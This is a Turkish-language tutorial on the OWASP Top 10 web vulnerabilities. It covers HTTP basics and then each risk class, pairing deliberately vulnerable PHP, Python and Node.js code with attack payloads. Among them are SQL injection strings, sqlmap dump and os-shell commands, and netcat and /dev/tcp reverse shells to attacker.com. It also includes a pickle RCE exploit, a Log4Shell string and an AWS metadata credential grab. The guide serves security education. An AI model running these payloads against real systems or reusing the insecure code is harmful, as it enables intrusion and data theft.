# 🛡️ OWASP Top 10 Web Güvenlik Zaafiyetleri: Sıfırdan Profesyonele Rehber

> **"Bir sistemi korumak için, önce onu kırmayı öğrenmelisin."** - Hacker Manifestosu

---

## 📋 İçindekiler

- [Level 0: Felsefe ve Giriş](#level-0-felsefe-ve-giriş)
- [Level 1: Temel Kavramlar](#level-1-temel-kavramlar)
- [Level 2: Web Mimarisi ve Protokoller](#level-2-web-mimarisi-ve-protokoller)
- [Level 3: OWASP Top 10 Zafiyetleri - Saldırı](#level-3-owasp-top-10-zafiyetleri---saldırı)
  - [A01: Broken Access Control](#a01-broken-access-control-erişim-kontrolü-zafiyeti)
  - [A02: Cryptographic Failures](#a02-cryptographic-failures-kriptografik-hatalar)
  - [A03: Injection](#a03-injection-enjeksiyon)
  - [A04: Insecure Design](#a04-insecure-design-güvensiz-tasarım)
  - [A05: Security Misconfiguration](#a05-security-misconfiguration-güvenlik-yanlış-yapılandırması)
  - [A06: Vulnerable Components](#a06-vulnerable-and-outdated-components-zafiyet-barındıran-bileşenler)
  - [A07: Authentication Failures](#a07-identification-and-authentication-failures-kimlik-doğrulama-hataları)
  - [A08: Software Data Integrity](#a08-software-and-data-integrity-failures-yazılım-ve-veri-bütünlüğü-hataları)
  - [A09: Security Logging Failures](#a09-security-logging-and-monitoring-failures-güvenlik-loglama-hataları)
  - [A10: SSRF](#a10-server-side-request-forgery-ssrf)
- [Level 4: Savunma Stratejileri](#level-4-savunma-stratejileri)
- [Level 5: İleri Seviye Teknikler](#level-5-i̇leri-seviye-teknikler)
- [Kaynaklar ve Laboratuvar Ortamları](#kaynaklar-ve-laboratuvar-ortamları)

---

## Level 0: Felsefe ve Giriş

### 🤔 OWASP Nedir ve Neden Önemlidir?

**OWASP (Open Web Application Security Project)**, web uygulama güvenliğini geliştirmeyi amaçlayan kar amacı gütmeyen, uluslararası bir topluluktur. 2001 yılından beri, en yaygın ve kritik web güvenlik risklerini belgelemiş ve bu listeyi düzenli olarak güncellemektedir.

**Gerçek Dünya Analojisi:**
Bir bina inşa ediyorsunuz. OWASP Top 10, "binaların en sık yıkılma nedenleri" listesidir. Deprem dayanımı, yangın güvenliği, hırsızlık önlemleri gibi kritik faktörleri öğreterek binanızın güvenli olmasını sağlar.

### 🎯 Bu Rehber Size Ne Kazandıracak?

Bu belge, **hiçbir güvenlik bilginiz olmasa bile** size şunları öğretecek:

1. ✅ Web uygulamalarının nasıl çalıştığını (HTTP, cookies, sessions)
2. ✅ Hackerların hangi teknikleri kullandığını (SQL Injection, XSS, CSRF)
3. ✅ Güvenli kod yazmayı ve güvenlik zaafiyetlerini nasıl düzelteceğinizi
4. ✅ Profesyonel penetrasyon testlerini nasıl yapacağınızı
5. ✅ Web Application Firewall (WAF) bypass tekniklerini

### 📊 OWASP Top 10 (2021) Listesi

```
┌─────────────────────────────────────────────────────────┐
│  OWASP Top 10 - 2021 Web Güvenlik Riskleri             │
├─────────────────────────────────────────────────────────┤
│ A01:2021 - Broken Access Control                        │
│ A02:2021 - Cryptographic Failures                       │
│ A03:2021 - Injection                                     │
│ A04:2021 - Insecure Design                              │
│ A05:2021 - Security Misconfiguration                    │
│ A06:2021 - Vulnerable and Outdated Components          │
│ A07:2021 - Identification and Authentication Failures   │
│ A08:2021 - Software and Data Integrity Failures        │
│ A09:2021 - Security Logging and Monitoring Failures    │
│ A10:2021 - Server-Side Request Forgery (SSRF)          │
└─────────────────────────────────────────────────────────┘
```

---

## Level 1: Temel Kavramlar

### 🔤 Temel Terminoloji

#### **Zafiyet (Vulnerability)**
Sistemdeki bir zayıflık veya hata. Kilitli olmayan bir kapı gibi.

#### **Exploit**
Zafiyeti kullanarak sisteme sızmak için kullanılan teknik veya araç. Kilidin nasıl açılacağını bilmek gibi.

#### **Payload**
Saldırının "zararlı yükü". Örnek: SQL Injection'da çalıştırılan SQL kodu.

#### **Attack Vector (Saldırı Vektörü)**
Saldırının gerçekleştirildiği giriş noktası. Örnek: Bir web formu, URL parametresi.

#### **Attack Surface (Saldırı Yüzeyi)**
Bir sistemde saldırıya açık tüm noktaların toplamı. Bir evin tüm kapı ve pencereleri gibi.

### 🌐 Web Uygulaması Temel Bileşenleri

```
┌─────────────────────────────────────────────────────┐
│                    İstemci (Client)                  │
│                   [Web Tarayıcı]                     │
│                         ↕                            │
│                    HTTP/HTTPS                        │
│                         ↕                            │
│                  Web Sunucusu                        │
│              (Apache, Nginx, IIS)                    │
│                         ↕                            │
│               Uygulama Sunucusu                      │
│          (PHP, Python, Java, Node.js)                │
│                         ↕                            │
│                   Veritabanı                         │
│            (MySQL, PostgreSQL, MongoDB)              │
└─────────────────────────────────────────────────────┘
```

### 🔐 Güvenlik Prensipleri (CIA Triad)

#### **Confidentiality (Gizlilik)**
Bilginin yetkisiz kişiler tarafından görülememesi.
- **Örnek:** Kullanıcı şifrelerinin hashlenmiş olması

#### **Integrity (Bütünlük)**
Verinin yetkisiz değiştirilmemesi.
- **Örnek:** Bir ödeme tutarının manipüle edilememesi

#### **Availability (Erişilebilirlik)**
Sistemin yetkili kullanıcılar için her zaman erişilebilir olması.
- **Örnek:** DDoS saldırılarına karşı korunma

---

## Level 2: Web Mimarisi ve Protokoller

### 📡 HTTP Protokolü Derinlemesine

#### **HTTP Request Yapısı**

```http
GET /user/profile?id=123 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123xyz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{"data": "example"}
```

**Request Bileşenleri:**
- **Method:** GET, POST, PUT, DELETE, PATCH
- **Path:** `/user/profile`
- **Query Parameters:** `?id=123`
- **Headers:** Metadata (cookies, authentication, content type)
- **Body:** POST/PUT requestlerde gönderilen veri

#### **HTTP Response Yapısı**

```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=abc123xyz; Secure; HttpOnly
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'

{"username": "john", "email": "john@example.com"}
```

**Response Status Codes:**
- **2xx:** Başarılı (200 OK, 201 Created)
- **3xx:** Yönlendirme (301 Moved, 302 Found)
- **4xx:** İstemci Hatası (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)
- **5xx:** Sunucu Hatası (500 Internal Server Error, 503 Service Unavailable)

### 🍪 Cookies ve Sessions

#### **Cookie Nedir?**

Cookie, tarayıcıda saklanan küçük bir veri parçasıdır. Genellikle oturum yönetimi için kullanılır.

**Cookie Yapısı:**
```
Set-Cookie: sessionid=abc123; 
            Domain=example.com; 
            Path=/; 
            Expires=Wed, 21 Oct 2025 07:28:00 GMT; 
            Secure; 
            HttpOnly; 
            SameSite=Strict
```

**Cookie Flags:**
- **Secure:** Sadece HTTPS üzerinden gönderilir
- **HttpOnly:** JavaScript tarafından okunamaz (XSS koruması)
- **SameSite:** CSRF saldırılarına karşı koruma

### 🔑 Authentication vs Authorization

```
┌─────────────────────────────────────────────────────┐
│  Authentication (Kimlik Doğrulama)                   │
│  "Sen kimsin?"                                       │
│  → Kullanıcı adı ve şifre kontrolü                  │
│  → Token doğrulama                                   │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  Authorization (Yetkilendirme)                       │
│  "Ne yapma yetkine var?"                             │
│  → Kullanıcı rollerini kontrol etme                  │
│  → Kaynak erişim izinlerini kontrol etme             │
└─────────────────────────────────────────────────────┘
```

---

## Level 3: OWASP Top 10 Zafiyetleri - Saldırı

> **⚠️ ETİK UYARI:** Bu bilgiler yalnızca eğitim amaçlıdır. Sadece sahip olduğunuz veya yazılı izin aldığınız sistemlerde test yapın.

---

## A01: Broken Access Control (Erişim Kontrolü Zafiyeti)

### 🎯 Zafiyet Açıklaması

Broken Access Control, kullanıcıların yetkisi olmadığı kaynaklara erişebildiği veya yetkisi olmadığı işlemleri gerçekleştirebildiği durumdur.

**Gerçek Dünya Analojisi:**
Bir otelde, 101 numaralı odada kalıyorsunuz. Anahtarınız yalnızca 101'i açmalı. Ancak anahtarınızla 102, 103 veya başka odaları da açabiliyorsanız, bu bir "Broken Access Control" problemidir.

### 🔍 Yaygın Access Control Zaafiyetleri

#### **1. IDOR (Insecure Direct Object Reference)**

**Zafiyet:**
```
# Kullanıcı profil sayfası
https://example.com/profile?user_id=1234
```

Eğer `user_id` parametresi değiştirildiğinde başka kullanıcıların profillerine erişilebiliyorsa IDOR vardır:

```
# Başka kullanıcının profili
https://example.com/profile?user_id=1235
https://example.com/profile?user_id=1236
```

**Zafiyet Barındıran Kod (PHP):**

```php
<?php
// ❌ GÜVENSİZ KOD
$user_id = $_GET['user_id'];  // Kullanıcı kontrolü YOK!

$query = "SELECT * FROM users WHERE id = $user_id";
$result = mysqli_query($conn, $query);
$user = mysqli_fetch_assoc($result);

echo "İsim: " . $user['name'] . "<br>";
echo "Email: " . $user['email'] . "<br>";
echo "Telefon: " . $user['phone'] . "<br>";
?>
```

**Neden Zafiyet Var?**
- Kullanıcının oturum açmış kullanıcı ile aynı kişi olup olmadığı kontrol edilmiyor
- Herkes herkesin bilgisine erişebilir

#### **2. Path Traversal**

**Zafiyet:**
```
https://example.com/download?file=invoice.pdf
```

Saldırgan, `file` parametresini manipüle ederek sistem dosyalarına erişebilir:

```
https://example.com/download?file=../../../etc/passwd
https://example.com/download?file=..\..\..\..\windows\system32\config\sam
```

**Zafiyet Barındıran Kod:**

```python
# ❌ GÜVENSİZ KOD
from flask import Flask, request, send_file

@app.route('/download')
def download_file():
    filename = request.args.get('file')
    return send_file(f'/uploads/{filename}')  # Doğrudan concatenation!
```

#### **3. Privilege Escalation (Yetki Yükseltme)**

**Zafiyet Senaryosu:**
```
Normal kullanıcı → Admin paneline erişim
```

**Örnek:**
```http
POST /user/edit HTTP/1.1
Host: example.com
Cookie: session=user_token

username=hacker&role=admin
```

Eğer sunucu `role` parametresini kontrol etmiyorsa, kullanıcı kendi rolünü admin yapabilir.

### 🛠️ Saldırı Metodolojisi

#### **Adım 1: Parametre Keşfi**

**Burp Suite ile Traffic İnceleme:**
```
1. Burp Proxy'yi başlat
2. Tarayıcıda uygulamayı kullan
3. HTTP History'de ID, user_id, file gibi parametreleri ara
4. Potansiyel IDOR noktalarını işaretle
```

#### **Adım 2: Değer Manipülasyonu**

**Sistematik Test:**
```python
# IDOR Testi için Python Script
import requests

base_url = "https://example.com/api/user/"

for user_id in range(1, 1000):
    response = requests.get(f"{base_url}{user_id}", 
                          cookies={"session": "your_token"})
    
    if response.status_code == 200:
        print(f"[+] Erişilebilir: User ID {user_id}")
        print(response.json())
```

#### **Adım 3: UUID/Hash Bypass**

Bazı uygulamalar sayısal ID yerine UUID kullanır:
```
https://example.com/profile/a3f5c2d1-4b8e-9f7a-1c2d-3e4f5a6b7c8d
```

**Bypass Teknikleri:**
- **UUID Enumeration:** Bazı UUID'ler tahmin edilebilir
- **Information Disclosure:** Başka endpointlerde UUID'lerin sızması
- **Timing Attacks:** Valid/invalid UUID response süreleri farklı olabilir

### 🧪 Lab Örneği

**Zafiyet Barındıran Uygulama:**

```javascript
// Node.js/Express - Zafiyet Barındıran Kod
app.get('/api/documents/:id', (req, res) => {
    const docId = req.params.id;
    
    // ❌ Kullanıcı yetkisi kontrolü YOK!
    db.query('SELECT * FROM documents WHERE id = ?', [docId], (err, result) => {
        if (result.length > 0) {
            res.json(result[0]);
        } else {
            res.status(404).send('Document not found');
        }
    });
});
```

**Exploit:**
```bash
# Normal kullanıcı kendi dokümanını okur
curl https://api.example.com/api/documents/123 \
  -H "Authorization: Bearer user_token"

# IDOR: Başka kullanıcının dokümanını okur
curl https://api.example.com/api/documents/456 \
  -H "Authorization: Bearer user_token"
```

---

## A02: Cryptographic Failures (Kriptografik Hatalar)

### 🎯 Zafiyet Açıklaması

Hassas verilerin yetersiz şifrelenmesi veya hiç şifrelenmemesi durumu.

**Kapsam:**
- Şifrelerin düz metin olarak saklanması
- Zayıf hash algoritmaları (MD5, SHA1)
- SSL/TLS yanlış yapılandırması
- Hassas veri iletiminde şifreleme eksikliği

### 🔍 Yaygın Kriptografik Hatalar

#### **1. Düz Metin Şifre Saklama**

**❌ Asla Yapılmaması Gereken:**

```sql
-- Veritabanında düz metin şifre
CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(100)  -- Düz metin!
);

INSERT INTO users VALUES (1, 'admin', 'Admin123!');
```

**Sonuç:**
Veritabanı sızdığında tüm şifreler ele geçer.

#### **2. Zayıf Hash Algoritmaları**

**❌ Zafiyet Barındıran Kod:**

```python
import hashlib

# MD5 kullanımı - ARTIK GÜVENLİ DEĞİL!
password = "mypassword123"
hashed = hashlib.md5(password.encode()).hexdigest()
# Çıktı: 6f1ed002ab5595859014ebf0951522d9
```

**Neden Zafiyet?**
- MD5 ve SHA1 collision saldırılarına açık
- Rainbow table'larla hızlıca kırılabilir
- GPU'larla saniyede milyarlarca hash denenebilir

**Rainbow Table Örneği:**
```
Password        MD5 Hash
--------        --------
password        5f4dcc3b5aa765d61d8327deb882cf99
123456          e10adc3949ba59abbe56e057f20f883e
admin           21232f297a57a5a743894a0e4a801fc3
```

#### **3. SSL/TLS Yanlış Yapılandırması**

**Zafiyet Kontrol:**
```bash
# SSL Labs Test
curl https://www.ssllabs.com/ssltest/analyze.html?d=example.com

# Desteklenen şifreleme protokollerini kontrol
nmap --script ssl-enum-ciphers -p 443 example.com
```

**Yaygın Hatalar:**
- TLS 1.0 / 1.1 hala aktif (deprecated)
- Zayıf cipher suite'ler destekleniyor
- Self-signed sertifika kullanımı
- Sertifika süresi dolmuş

### 🛠️ Saldırı Teknikleri

#### **Senaryo 1: SQL Injection ile Şifre Hash'lerini Çalma**

```sql
-- Admin hash'ini çalma
' UNION SELECT username, password_hash FROM users WHERE role='admin'--
```

**Sonuç:**
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
```

#### **Senaryo 2: Hash Kırma**

**Hashcat ile MD5 Kırma:**
```bash
# Wordlist saldırısı
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Brute force (8 karakter, küçük harf + rakam)
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?d?d?d?d

# -m 0: MD5
# -a 0: Wordlist attack
# -a 3: Brute force
```

**John the Ripper ile:**
```bash
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
john --show hashes.txt
```

#### **Senaryo 3: Man-in-the-Middle (MITM)**

**HTTP Üzerinden Şifre İletimi:**
```
Kullanıcı → [HTTP - DÜZ METİN] → Sunucu
            ↓
         Saldırgan (Wireshark ile dinliyor)
```

**Wireshark Filtreleme:**
```
http.request.method == "POST" && http contains "password"
```

---

## A03: Injection (Enjeksiyon)

### 🎯 Zafiyet Açıklaması

Kullanıcıdan gelen güvenilmez verinin, uygulama tarafından doğrudan komut veya sorgu olarak çalıştırılması durumu.

**Injection Türleri:**
- SQL Injection
- Command Injection (OS)
- LDAP Injection
- XPath Injection
- NoSQL Injection
- CRLF Injection

### 💉 SQL Injection (SQLi)

#### **Nasıl Çalışır?**

**Normal SQL Sorgusu:**
```sql
SELECT * FROM users WHERE username='admin' AND password='123456';
```

**Zafiyet Barındıran Kod:**
```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
?>
```

#### **SQL Injection Saldırısı**

**Giriş Değerleri:**
```
Username: admin'--
Password: anything
```

**Oluşan SQL Sorgusu:**
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything';
```

**Açıklama:**
- `'` tırnağı kapatır
- `--` SQL'de comment başlatır
- Password kontrolü bypass edilir

#### **SQL Injection Türleri**

**1. Classic/In-band SQLi**

**Error-Based SQLi:**
```sql
' OR 1=1--
' UNION SELECT NULL, NULL, NULL--
' AND 1=CONVERT(int, (SELECT @@version))--
```

**Union-Based SQLi:**
```sql
' UNION SELECT username, password, email FROM users--
' UNION SELECT 1,2,table_name FROM information_schema.tables--
```

**2. Blind SQLi**

**Boolean-Based:**
```sql
' AND 1=1--  → Sayfa normal görünür
' AND 1=2--  → Sayfa hata verir veya farklı görünür
```

**Time-Based:**
```sql
' AND SLEEP(5)--  → Sayfa 5 saniye gecikirse zafiyet var
' OR IF(1=1, SLEEP(5), 0)--
```

**3. Out-of-Band SQLi**
```sql
'; EXEC xp_cmdshell('nslookup attacker.com')--
```

### 🧪 SQLi Saldırı Metodolojisi

#### **Adım 1: Zafiyet Tespiti**

**Test Payloads:**
```
'
"
`
')
")
`))
')--
")--
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
" OR "1"="1"--
```

**Cevap Analizi:**
```
✓ SQL hatası → Error-Based SQLi potansiyeli
✓ Sayfa değişimi → Boolean-Based SQLi potansiyeli
✓ Zaman gecikmesi → Time-Based SQLi potansiyeli
✓ Farklı veri → Union-Based SQLi potansiyeli
```

#### **Adım 2: Kolon Sayısı Tespiti (UNION için)**

```sql
' ORDER BY 1--  ✓ Çalıştı
' ORDER BY 2--  ✓ Çalıştı
' ORDER BY 3--  ✓ Çalıştı
' ORDER BY 4--  ✗ Hata → 3 kolon var
```

#### **Adım 3: Veritabanı Bilgisi Çekme**

**MySQL:**
```sql
' UNION SELECT NULL, @@version, database()--
' UNION SELECT NULL, user(), schema_name FROM information_schema.schemata--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL, version(), current_database()--
```

**MSSQL:**
```sql
' UNION SELECT NULL, @@version, DB_NAME()--
```

#### **Adım 4: Tablo ve Kolon İsimleri**

```sql
-- Tablo isimlerini alma (MySQL)
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Kolon isimlerini alma
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

#### **Adım 5: Hassas Veri Çekme**

```sql
' UNION SELECT username, password FROM users--
' UNION SELECT group_concat(username,':',password) FROM users--
```

### 🔧 SQLMap ile Otomatik SQLi

```bash
# Basic scan
sqlmap -u "http://example.com/page?id=1"

# Cookie ile authenticated scan
sqlmap -u "http://example.com/page?id=1" \
       --cookie="PHPSESSID=abc123xyz"

# POST request
sqlmap -u "http://example.com/login" \
       --data="username=admin&password=pass" \
       -p username

# Veritabanı dump
sqlmap -u "http://example.com/page?id=1" --dbs
sqlmap -u "http://example.com/page?id=1" -D database_name --tables
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --dump

# OS Shell almak
sqlmap -u "http://example.com/page?id=1" --os-shell
```

### 💻 Command Injection

#### **Zafiyet Senaryosu**

**Zafiyet Barındıran Kod (PHP):**
```php
<?php
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo "<pre>$output</pre>";
?>
```

**URL:**
```
http://example.com/ping.php?ip=8.8.8.8
```

#### **Saldırı**

**Payload:**
```
http://example.com/ping.php?ip=8.8.8.8; whoami
http://example.com/ping.php?ip=8.8.8.8; cat /etc/passwd
http://example.com/ping.php?ip=8.8.8.8 && ls -la
http://example.com/ping.php?ip=8.8.8.8 | nc attacker.com 4444 -e /bin/bash
```

**Çalışan Komut:**
```bash
ping -c 4 8.8.8.8; whoami
```

#### **Reverse Shell Alma**

```bash
# Saldırgan makinesinde listener başlat
nc -lvnp 4444

# Hedef sunucuda (Command Injection ile)
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

**URL Encoded:**
```
http://example.com/ping.php?ip=8.8.8.8;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.5%2F4444%200%3E%261
```

---

## A04: Insecure Design (Güvensiz Tasarım)

### 🎯 Zafiyet Açıklaması

Güvenlik gereksinimlerinin tasarım aşamasında düşünülmemesi veya yanlış uygulanması.

**Fark:**
- **Insecure Implementation:** Güvenli tasarım ama kötü kod
- **Insecure Design:** Temelde tasarım hatası

### 📊 Yaygın Tasarım Hataları

#### **1. Rate Limiting Eksikliği**

**Zafiyet Senaryosu:**
```
Login sayfası → Sınırsız deneme hakkı
```

**Brute Force Saldırısı:**
```python
import requests

passwords = ['123456', 'password', 'admin123', '12345678']

for pwd in passwords:
    response = requests.post('http://example.com/login', 
                           data={'username': 'admin', 'password': pwd})
    
    if 'Welcome' in response.text:
        print(f"[+] Şifre bulundu: {pwd}")
        break
```

#### **2. Business Logic Bypass**

**Zafiyet Örneği - E-commerce:**

```
1. Sepete ürün ekle: laptop = $1000
2. Checkout sayfası: Total = $1000
3. Burp ile isteği yakala
4. Price değerini değiştir: price=-1000
5. İsteği gönder
6. Sonuç: Ödeme yerine para alırsın!
```

**Zafiyet Barındıran Kod:**
```javascript
// ❌ Client-side'dan fiyat alınıyor!
app.post('/checkout', (req, res) => {
    const { product_id, price, quantity } = req.body;
    const total = price * quantity;  // Kullanıcı price'ı manipüle edebilir!
    
    processPayment(total);
});
```

#### **3. Account Enumeration**

**Zafiyet:**
```
Login hatası: "Kullanıcı adı veya şifre hatalı" ✓ GÜVENLİ
Login hatası: "Bu kullanıcı mevcut değil" ✗ GÜVENSİZ
```

**Saldırı:**
```python
# Var olan kullanıcı adlarını tespit etme
usernames = ['admin', 'root', 'user', 'test']

for user in usernames:
    response = requests.post('/login', data={'username': user, 'password': 'wrong'})
    
    if 'kullanıcı mevcut değil' in response.text:
        print(f"[-] {user} mevcut değil")
    else:
        print(f"[+] {user} mevcut - brute force hedefi!")
```

---

## A05: Security Misconfiguration (Güvenlik Yanlış Yapılandırması)

### 🎯 Yaygın Yanlış Yapılandırmalar

#### **1. Default Credentials (Varsayılan Şifreler)**

**Yaygın Varsayılan Şifreler:**
```
admin:admin
admin:password
root:root
admin:12345
administrator:administrator
```

**Kontrol:**
```bash
# Hydra ile brute force
hydra -L users.txt -P passwords.txt http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

#### **2. Directory Listing Aktif**

**Zafiyet:**
```
http://example.com/uploads/
→ Tüm yüklenen dosyaların listesi görünür!
```

**Apache'de Directory Listing:**
```apache
<Directory /var/www/html/uploads>
    Options +Indexes  # ❌ Bu satır zararlı!
</Directory>
```

#### **3. Hassas Dosyaların İfşası**

**Yaygın Hedef Dosyalar:**
```
/.git/config
/.env
/config.php
/wp-config.php
/web.config
/.DS_Store
/robots.txt
/sitemap.xml
/phpinfo.php
/server-status
/.htaccess
```

**Tarama:**
```bash
# FFUF ile dizin tarama
ffuf -u http://example.com/FUZZ -w wordlist.txt

# Gobuster ile
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt

# Nikto ile zafiyet tarama
nikto -h http://example.com
```

#### **4. Stack Trace İfşası**

**❌ Üretim Ortamında Debug Modu:**
```python
# Flask
app.run(debug=True)  # ❌ ASLA PRODUCTION'DA KULLANMA!
```

**Sonuç:**
```
Traceback (most recent call last):
  File "/var/www/app.py", line 42, in process_payment
    db.execute("INSERT INTO orders VALUES (?, ?, ?)", order_id, user_id, total)
sqlite3.OperationalError: no such table: orders
```

**Saldırgan şunları öğrenir:**
- Dosya yapısı (`/var/www/app.py`)
- Veritabanı türü (SQLite)
- Tablo isimleri ve yapısı
- Kod mantığı

---

## A06: Vulnerable and Outdated Components (Zafiyet Barındıran Bileşenler)

### 🎯 Zafiyet Açıklaması

Güncel olmayan veya zafiyet barındıran kütüphane, framework ve bileşenlerin kullanılması.

### 🔍 Zafiyet Tespiti

#### **1. Dependency Scanning**

**NPM Audit (Node.js):**
```bash
npm audit
npm audit fix
npm audit fix --force
```

**Pip Check (Python):**
```bash
pip list --outdated
safety check
```

**Composer (PHP):**
```bash
composer outdated
composer audit
```

#### **2. CVE Veritabanı Kontrolü**

**Online Araçlar:**
- [CVE Details](https://www.cvedetails.com/)
- [National Vulnerability Database](https://nvd.nist.gov/)
- [Snyk Vulnerability DB](https://snyk.io/vuln)

**Örnek CVE Arama:**
```
jQuery 1.x.x → CVE-2020-11022 (XSS)
Apache Struts 2.3.x → CVE-2017-5638 (RCE)
Log4j 2.x → CVE-2021-44228 (RCE - Log4Shell)
```

### 🛠️ Gerçek Dünya Örneği: Log4Shell

**CVE-2021-44228 (Log4Shell):**

**Zafiyet:**
```java
// Log4j ile loglama
logger.info("User {} logged in", userInput);
```

**Exploit:**
```
${jndi:ldap://attacker.com/exploit}
```

**Saldırı Akışı:**
```
1. Saldırgan zararlı JNDI stringini gönderir
2. Log4j bu stringi parse eder
3. LDAP sunucusuna bağlanır
4. Zararlı Java class'ını indirir ve çalıştırır
5. Remote Code Execution (RCE)!
```

---

## A07: Identification and Authentication Failures (Kimlik Doğrulama Hataları)

### 🎯 Zafiyet Türleri

#### **1. Weak Password Policy**

**❌ Zayıf Politika:**
```
- Minimum 6 karakter
- Özel karakter gerekmiyor
- Parola değişimi zorunlu değil
```

**Brute Force ile Kırma:**
```bash
# Hydra ile
hydra -l admin -P rockyou.txt http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# Medusa ile
medusa -h example.com -u admin -P rockyou.txt -M http \
  -m DIR:/login -m FORM:"username=^USER^&password=^PASS^" \
  -m DENY:"Invalid"
```

#### **2. Session Fixation**

**Zafiyet:**
```
1. Saldırgan session ID oluşturur: ABC123
2. Kurbanın tarayıcısına bu session ID'yi yerleştirir
3. Kurban giriş yapar
4. Session ID değişmez (hala ABC123)
5. Saldırgan ABC123 ile giriş yapar → Oturum ele geçirilir!
```

**Zafiyet Barındıran Kod:**
```php
<?php
session_start();  // Mevcut session ID'yi kullanır
// ❌ Login sonrası session_regenerate_id() çağrılmıyor!

if ($_POST['username'] == 'admin' && $_POST['password'] == 'pass') {
    $_SESSION['logged_in'] = true;
    $_SESSION['username'] = 'admin';
}
?>
```

#### **3. JWT Zafiyetleri**

**JWT Yapısı:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.signature
    ↓           ↓                                  ↓               ↓
  Header      Payload                           Signature
```

**Decode:**
```json
// Header
{"alg": "HS256", "typ": "JWT"}

// Payload
{"user": "admin", "role": "user"}
```

**Yaygın JWT Zafiyetleri:**

**1) Algorithm Confusion:**
```json
// ❌ "alg" değerini "none" yap
{"alg": "none", "typ": "JWT"}
{"user": "admin", "role": "admin"}
```

**2) Weak Secret:**
```bash
# JWT Cracking (hashcat)
hashcat -m 16500 -a 0 jwt.txt rockyou.txt
```

**3) Key Confusion (RS256 → HS256):**
```
RS256: Public/Private key kullanır
HS256: Secret key kullanır

Saldırı: Public key'i secret olarak kullanarak JWT oluştur!
```

---

## A08: Software and Data Integrity Failures (Yazılım ve Veri Bütünlüğü Hataları)

### 🎯 Zafiyet Açıklaması

**Kapsamı:**
- Güvenilmeyen kaynaklardan kod çalıştırma
- CI/CD pipeline zafiyetleri
- Auto-update mekanizması hijacking
- Deserialization saldırıları

### 💣 Insecure Deserialization

#### **Zafiyet Nedir?**

Serialization: Nesneyi byte stream'e çevirme
Deserialization: Byte stream'i tekrar nesneye çevirme

**Zafiyet:** Güvenilmeyen veriyi deserialize etmek → RCE!

#### **Python Pickle Örneği**

**Zafiyet Barındıran Kod:**
```python
import pickle

# ❌ Kullanıcıdan gelen veriyi deserialize etme!
user_data = request.cookies.get('session')
session = pickle.loads(base64.b64decode(user_data))
```

**Exploit:**
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('nc attacker.com 4444 -e /bin/bash',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload))
```

#### **PHP Unserialize**

**Zafiyet:**
```php
<?php
$data = $_COOKIE['user'];
$user = unserialize($data);  // ❌ Tehlikeli!
?>
```

**Magic Methods Exploitation:**
```php
class Evil {
    public $cmd;
    
    function __destruct() {
        system($this->cmd);  // Object yok edildiğinde çalışır
    }
}

$payload = 'O:4:"Evil":1:{s:3:"cmd";s:10:"cat /etc/passwd";}';
```

---

## A09: Security Logging and Monitoring Failures (Güvenlik Loglama Hataları)

### 🎯 Zafiyet Açıklaması

Saldırıların tespiti ve müdahalesi için gerekli log ve monitoring mekanizmalarının eksikliği.

### 📝 Loglanması Gereken Olaylar

```
✓ Login denemeleri (başarılı ve başarısız)
✓ Yetki yükseltme denemeleri
✓ Input validation hataları
✓ Authentication/Authorization hataları
✓ Uygulama hataları ve exception'lar
✓ Kritik işlemler (şifre değişikliği, ödeme, vb.)
```

### 🔍 Log Analizi

**Şüpheli Aktivite Tespiti:**
```bash
# Brute force tespiti (çok sayıda başarısız login)
grep "Failed login" /var/log/auth.log | cut -d' ' -f1-3,11 | sort | uniq -c | sort -nr

# SQL Injection denemesi tespiti
grep -i "union\|select\|drop\|insert" /var/log/apache2/access.log

# Directory traversal tespiti
grep -E "\.\./|\.\.\\" /var/log/apache2/access.log
```

---

## A10: Server-Side Request Forgery (SSRF)

### 🎯 Zafiyet Açıklaması

Sunucunun, saldırganın kontrol ettiği bir URL'e istek yapması.

### 🔍 SSRF Saldırı Senaryoları

#### **1. Internal Network Scanning**

**Zafiyet Barındıran Kod:**
```python
from flask import Flask, request
import requests

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)  # ❌ URL doğrulanmıyor!
    return response.content
```

**Exploit:**
```
http://example.com/fetch?url=http://localhost:22
http://example.com/fetch?url=http://127.0.0.1:3306
http://example.com/fetch?url=http://192.168.1.1/admin
```

#### **2. AWS Metadata Endpoint**

**AWS EC2 Metadata:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Saldırı:**
```
http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```

**Sonuç:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalr...",
  "Token": "FwoGZXIvYXdz..."
}
```

#### **3. SSRF Bypass Teknikleri**

